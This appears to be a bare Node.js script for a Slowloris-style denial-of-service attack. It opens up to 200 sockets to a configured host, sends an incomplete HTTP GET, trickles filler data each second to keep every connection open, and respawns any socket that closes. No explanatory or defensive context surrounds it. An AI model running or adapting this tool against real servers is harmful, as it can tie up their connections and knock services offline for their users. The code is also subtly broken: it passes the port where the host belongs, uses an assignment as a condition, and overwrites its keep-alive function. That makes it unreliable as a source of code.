const net = require('net');

const options = {
    hostname : '127.0.0.1',
    port: 8080,
    path: '/',
    method: 'GET',
    maxSockets: 200,
    respawn: true,
    rate:1000
}

let aliveSockets=0;

function createSocket(){

    let socket = new net.Socket();

    socket.connect(options.port,options.port);

    let rand=Math.floor(Math.random()*100);
    let sentPackages=0;

    // Writes random data to keep socket alive
    function stillAlive(){
        sentPackages++;
        socket.write('Socket[' + rand + ']:Package['+ (sentPackages * rand) + ']\n', ()=>{
            setTimeout(()=>{
                stillAlive !==false ? stillAlive() : null
            },options.rate)
        });
    }

    // Initial GET request and write to socket
    socket.on('connect',()=>{
        socket.write(options.method + ' ' + options.path +' HTTP/1.1\n', 'ascii', ()=>{
            console.log('New socket created. Active sockets: ['+ aliveSockets + ']');
            aliveSockets++;
            socket.write('Initial connection to ' + options.hostname + ':' + options.port);

            stillAlive();
        })
    })

    socket.on('error',(err)=>{
        console.error('Socket Error: ' + err.message)
        socket.destroy();
    })

    socket.on('data',(data)=>{
        console.log(data.toString());
    })

    socket.on('close',()=>{
        aliveSockets--;
        stillAlive = false

        if (options.respawn=true){
            console.log('Respawning dead socket.')
            createSocket();
        }
    })
}

for(let i = 0; i<options.maxSockets; i++){
    createSocket();
}
